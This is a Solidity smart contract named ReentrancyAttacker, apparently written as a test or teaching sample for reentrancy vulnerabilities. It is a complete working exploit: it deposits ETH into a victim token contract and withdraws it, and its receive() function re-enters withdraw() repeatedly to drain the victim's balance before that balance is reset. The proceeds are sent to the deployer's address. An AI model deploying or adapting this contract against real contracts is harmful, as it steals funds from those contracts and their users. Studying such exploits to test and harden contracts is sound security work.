// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

interface IWrappedToken {
  function deposit(uint256 amount) external payable;
  function withdraw() external;
}

/**
 * @dev Deposits a small amount and withdraws it. Every time `victim` sends ETH, `receive` runs and calls
 * `withdraw` again before `victim` resets the balance, until `victim` does not have enough ETH left.
 */
contract ReentrancyAttacker {
  IWrappedToken public immutable victim;
  address public immutable attacker;
  uint256 public amount;

  constructor(IWrappedToken victim_) {
    victim = victim_;
    attacker = msg.sender;
  }

  function attack() external payable {
    amount = msg.value;
    victim.deposit{value: amount}(amount);
    victim.withdraw();

    (bool success, ) = attacker.call{value: address(this).balance}("");
    require(success, "ETH transfer failed");
  }

  receive() external payable {
    if (address(victim).balance >= amount) {
      victim.withdraw();
    }
  }
}
